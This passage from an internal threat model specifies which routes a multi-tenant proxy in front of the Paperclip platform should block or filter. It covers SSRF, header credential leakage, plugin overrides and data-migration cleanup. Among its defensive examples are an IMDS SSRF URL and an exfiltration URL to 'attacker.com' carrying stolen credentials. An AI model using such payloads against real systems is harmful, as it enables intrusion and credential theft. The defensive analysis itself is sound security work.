| `/_plugins/:pluginId/ui/*filePath` | `routes/plugin-ui-static.ts` | **BLOCK** (serves plugin-supplied JS to anyone — XSS to whoever loads it) |

---

## 3. Still-reachable after filter (defence-in-depth needed)

Even with every FILTER_REQUEST/BLOCK above wired correctly, a tenant who can speak `openclaw_gateway` retains the following capabilities. None are show-stoppers but the proxy author should know about them.

### 3.1 SSRF via `openclaw_gateway` test/execute URLs

`packages/adapters/openclaw-gateway/src/server/test.ts:212-247` and `execute.ts` both connect to **whatever `adapterConfig.url` says**, with no host allowlist. The schema only checks: (a) URL is parseable, (b) protocol is `ws://` or `wss://`. There is a `level: "warn"` check for plaintext-ws-to-non-loopback (line 239), but it does not refuse — it still opens the socket.

What this means concretely:
- Tenant sets `adapterConfig.url = "ws://169.254.169.254/latest/meta-data/iam/..."`. Paperclip opens a WebSocket handshake to IMDS. IMDS rejects (it's not a ws server) but the connect is attempted.
- Tenant sets `adapterConfig.url = "ws://internal-isol8-service:8080/..."`. Connect attempted from inside the VPC.
- Tenant sets `adapterConfig.url = "wss://attacker.com/exfil?token=..."` and shoves Aurora creds into the headers via `adapterConfig.headers`. Paperclip will dutifully send custom headers (`packages/adapters/openclaw-gateway/src/server/test.ts:102 — headers passed to WebSocket()`).

**Defence-in-depth options the proxy author should layer:**
1. Inspect `$.adapterConfig.url` (and `$.adapterConfig.headers`) on every FILTER_REQUEST listed above and refuse non-Lightbulb URLs. Allowlist: `wss://gateway-{tenantId}.openclaw.isol8.internal/` or whatever the per-tenant gateway hostname pattern is.
2. Network-level: Paperclip's egress security group should disallow RFC1918, IMDS, and 0.0.0.0/0 except per-tenant gateway ranges.
3. Log all probe URLs — they're trivially abused.

### 3.2 `adapterConfig.headers` leaks proxy auth

`openclaw_gateway` adapter forwards arbitrary headers from `adapterConfig.headers` to the WebSocket handshake (`test.ts:102`). If tenant A can read tenant B's `adapterConfig.headers` (through a misconfigured response filter, a logging endpoint, or anywhere), they can replay tenant B's auth into their own gateway URL. Recommend: mark `adapterConfig.headers` and `adapterConfig.{authToken,token,password}` as redact-on-response everywhere.

### 3.3 `adapterConfig.devicePrivateKeyPem` is auto-injected on hire

`routes/agents.ts:823-828` (`ensureGatewayDeviceKey`) injects an Ed25519 private key into `adapterConfig.devicePrivateKeyPem` for every `openclaw_gateway` agent on creation. The key is generated by Paperclip and lives in the (shared) Aurora DB. Any cross-tenant DB exposure (e.g. via the Aurora master creds in `process` env) leaks every tenant's gateway device identity. Mitigation is out-of-scope for the proxy filter but worth keeping in mind.

### 3.4 Issue patch with `assigneeAdapterOverrides.adapterConfig.workspaceStrategy.{provisionCommand, teardownCommand}`

`packages/shared/src/validators/issue.ts:46` allows board users (= tenants) to set `provisionCommand` / `teardownCommand` per issue. `routes/workspace-command-authz.ts:43-48` only blocks **agent** actors — board actors are explicitly allowed. These commands run on whatever execution workspace the issue uses. With openclaw_gateway as the only allowed adapter type, the agent isn't running on Paperclip's host so this should be inert — **but** confirm that path before declaring it safe. The proxy can additionally strip `assigneeAdapterOverrides.adapterConfig.workspaceStrategy` from any issue create/patch body to be safe. Routes affected: `POST /api/companies/:companyId/issues`, `POST /api/issues/:id/children`, `PATCH /api/issues/:id`.

### 3.5 Project workspace runtime commands

`POST /api/projects/:id/workspaces/:workspaceId/runtime-services/:action` and `runtime-commands/:action` (and the execution-workspace variants) execute predefined `workspaceCommand` records against the workspace. These commands are **stored** on the project; the route only takes a `:action` (start/stop/restart) parameter. Risk surface is the project / workspace patch endpoints that *write* those commands — those are PATCH endpoints on `/api/projects/:id/workspaces/:workspaceId` (see `routes/projects.ts`). Recommend: BLOCK or filter project-workspace-patch endpoints on any `cleanupCommand`/`provisionCommand`/`teardownCommand` field.

### 3.6 Pre-existing rows from before the filter shipped (state-cleanup)

The filter only blocks new bad input. There may already be:
- `agents.adapterType !== "openclaw_gateway"` rows in DDB/Aurora.
- `agents.config_revisions` snapshots with old adapter types (rollback target).
- `approvals.payload.adapterType` for `hire_agent` approvals.
- `joinRequests.adapterType` from invites accepted before the filter.
- `companies.import` bundles cached for re-application.

The proxy filter author should pair the PR with a **one-shot data-migration job** that:
- `UPDATE agents SET adapter_type = 'openclaw_gateway' WHERE adapter_type != 'openclaw_gateway'`
- (or `DELETE` such rows — depends on whether we want to preserve history)
- Same for `agents_config_revisions.snapshot_json` (drilling into JSON to fix `adapterType` field).
- Same for `approvals.payload.adapterType` where `type='hire_agent' AND status IN ('pending','revision_requested')`.
- `UPDATE join_requests SET adapter_type = 'openclaw_gateway' WHERE adapter_type IS NULL OR adapter_type != 'openclaw_gateway'` (this row drives `/approve` — service code defaults to `'process'` on null).

### 3.7 Plugin contributions can carry adapters

`adapters/plugin-loader.ts` (`buildExternalAdapters`) loads adapters from npm packages registered in the adapter-plugin store at server start. **A plugin shipped with Paperclip's image, or smuggled in via the install route, can register adapter types we haven't anticipated.** The disabled-types pre-write in §4 covers known builtins; for plugins, we additionally need to refuse any adapterType the proxy filter doesn't have on its allowlist. The current allowlist `{ "openclaw_gateway" }` already does this — just be aware that "openclaw_gateway" itself can be **overridden by an external plugin** with the same `type` string (`adapters/registry.ts:434-449`). If an attacker (or a buggy plugin) registers an overriding `openclaw_gateway` external adapter, the override version runs instead. Defence: ensure no `openclaw_gateway` entry is in `adapter-plugins.json` and that the plugins dir on the host is locked down at the file-system layer.

---

## 4. Defence-in-depth: adapter-plugin-store pre-disable

We can **disable** every adapter except `openclaw_gateway` at the host file-system layer, before Paperclip starts. This is not enforced at the route layer (a tenant who can hit `POST /api/agents/...` with `adapterType: "process"` will still bypass), but the `disabled` flag is honored by `listEnabledServerAdapters()` (`adapters/registry.ts:546-552`) which the UI uses for menus, and **the disabled flag suppresses the adapter from the inventory**, so a defense-in-depth pre-write catches anything we missed at the route layer for the cases where Paperclip itself checks `isAdapterDisabled`.

**Caveat:** the disabled flag does **not** prevent `execute()` or `testEnvironment()` for already-running sessions, and does **not** prevent agent creation with a disabled adapterType (the route's `assertKnownAdapterType` only checks `findServerAdapter(type)`, not `findActiveServerAdapter(type)` — see `routes/agents.ts:547`). So this is a UI / discovery hardening, not a security gate. The real gate is the proxy filter.

### 4.1 File location

The adapter-settings store path comes from `services/adapter-plugin-store.ts:46-53` + `home-paths.ts:15-19`:

```
${PAPERCLIP_HOME:-$HOME/.paperclip}/adapter-settings.json
```

Note: this lives at the *Paperclip home root*, **not** under the per-instance subdir (`instances/<id>/`). Same file regardless of `PAPERCLIP_INSTANCE_ID`.

### 4.2 Exact JSON shape to write

```json
{
  "disabledTypes": [
    "acpx_local",
    "claude_local",
    "codex_local",
    "cursor",
    "gemini_local",
    "opencode_local",
    "pi_local",
    "hermes_local",
    "process",
    "http"
  ]
}
```

Read & write semantics from `adapter-plugin-store.ts:104-127`: the file is read on first access, cached in-memory, invalidated on write. We are pre-writing it; Paperclip will pick it up on first read.

### 4.3 Sibling file: `adapter-plugins.json`

Same directory: `${PAPERCLIP_HOME}/adapter-plugins.json`. Schema is an `AdapterPluginRecord[]` (`adapter-plugin-store.ts:23-36`):

```json
[]
```

Write `[]` (empty array) at provisioning time to ensure no pre-installed external adapter plugin survives. Without this, a future image bake-in could ship with extras. (Per §3.7 above, this also forecloses the "plugin overrides openclaw_gateway by registering same type" attack.)

### 4.4 Plugins dir

`${PAPERCLIP_HOME}/adapter-plugins/` — `getAdapterPluginsDir()` in `adapter-plugin-store.ts:161`. This is where `npm install` lands. Even though we BLOCK the install route, mount this dir read-only on the Paperclip container if possible.

---

## 5. Open questions

These are items the proxy filter author should clarify before merging the filter PR — answered "yes" or "no", they don't block the spec, but they change the disposition of specific routes.

1. **Q: Does the Lightbulb proxy ever forward a request as `req.actor.isInstanceAdmin = true`?**
   File to check: `paperclip/server/src/middleware/auth.ts` (the `actorMiddleware` factory) and however Lightbulb forwards its service-account cookie.
   Why it matters: every `assertInstanceAdmin` route (the entire `/api/adapters/*` write surface) trusts that flag. If the answer is yes, those BLOCK dispositions are mandatory; if the answer is no, they're already 403 from Paperclip and we can simplify to ALLOW (but defence-in-depth says still BLOCK).

2. **Q: Does the Lightbulb proxy ever inject a tenant-scoped `companyIds` array, or always forward as a single board-style identity?**
   File to check: same — `actorMiddleware` and the better-auth bridge. Specifically `routes/authz.ts:42-64` (`assertCompanyAccess`).
   Why it matters: GET `/api/companies` filters on `req.actor.companyIds`. If the proxy forwards a single identity that has access to *every* tenant's company, the filter doesn't help — we need to do tenant-scoping at the proxy.

3. **Q: Are users ever authenticated as `req.actor.type === "agent"` through the proxy?**
   File to check: same.
   Why it matters: many of the `assertNoAgentHostWorkspaceCommandMutation` checks only fire for `actor.type === "agent"`. If our tenants always come in as "board", those host-workspace-command escapes (§3.4) are open by default.

4. **Q: Does `routes/access.ts:3210` (`/api/invites/:token/accept`) get hit through the proxy as a tenant-authenticated request, or as the unauthenticated invite-token flow?**
   File to check: middleware/auth.ts handling of invite-token endpoints.
   Why it matters: if it's unauthenticated, the FILTER_REQUEST is straightforward. If our proxy somehow wraps it in a tenant identity, the filter still works but the threat surface is different.

5. **Q: Does `routine-triggers/public/:publicId/fire` (`routes/routines.ts:306`) traverse the proxy at all, or does it bypass?**
   File to check: Lightbulb proxy routing config.
   Why it matters: it's unauthenticated. If it traverses the proxy, we should still inspect to make sure no body fields can change adapter behaviour. (After review: the body is just signed/HMAC payload data, not adapter config — ALLOW is correct.)

6. **Q: Are `/api/auth/{*authPath}` routes ever expected to be tenant-reachable?**
   File to check: app.ts:171. better-auth handler.
   Why it matters: I marked it BLOCK. Confirm tenants never sign in to Paperclip's own auth surface.

7. **Q: What does `req.actor.companyIds` contain when our service-account-cookie traverses Paperclip?**
   File to check: `routes/authz.ts:42-64` and however Lightbulb mints the cookie.
   Why it matters: if it's `null` / `undefined`, `assertBoardOrgAccess` (`authz.ts:26-32`) will throw because of `Array.isArray(req.actor.companyIds) && req.actor.companyIds.length > 0`. Many ALLOW routes use this — if it consistently throws, the proxy will see a lot of 403s where we expect 200s.

8. **Q: Is the project-workspace `cleanupCommand` patch already filtered by Lightbulb's surface, or does it traverse the proxy?**
   File to check: Lightbulb proxy + `routes/projects.ts` `PATCH /:id/workspaces/:workspaceId`.
   Why it matters: §3.5 — that's a quiet command-execution surface the adapter filter won't catch.

9. **Q: Does the openclaw_gateway adapter's `execute()` actually need the `headers` field in `adapterConfig` to be tenant-controlled?**
   File to check: `apps/backend/...` Lightbulb backend code that constructs gateway-agent payloads when provisioning, and `packages/adapters/openclaw-gateway/src/server/execute.ts:235-246`.
   Why it matters: if Lightbulb backend always sets `adapterConfig.headers` server-side and the tenant never needs to specify them, the proxy can strip the field on every FILTER_REQUEST and close §3.2. If tenants need it, we have to allowlist values.

---

## 6. Cross-references

- All adapter type names and which are dangerous: `paperclip/server/src/adapters/builtin-adapter-types.ts:4-16`
- The `assertKnownAdapterType` helper that gates agent create/update on Paperclip's side: `paperclip/server/src/routes/agents.ts:541-551`
- The schema default that gives `"process"` for free: `paperclip/packages/shared/src/adapter-type.ts:4-9`
- The fallback in approval-apply: `paperclip/server/src/services/approvals.ts:125`
- The fallback in join-request approval: `paperclip/server/src/routes/access.ts:3786`
- The fallback in company-portability import: `paperclip/server/src/services/company-portability.ts:2495`
- `BUILTIN_ADAPTER_TYPES`: `paperclip/server/src/adapters/builtin-adapter-types.ts`
- Disabled-adapter store: `paperclip/server/src/services/adapter-plugin-store.ts`
- openclaw_gateway adapter (the only allowed one): `paperclip/packages/adapters/openclaw-gateway/src/`
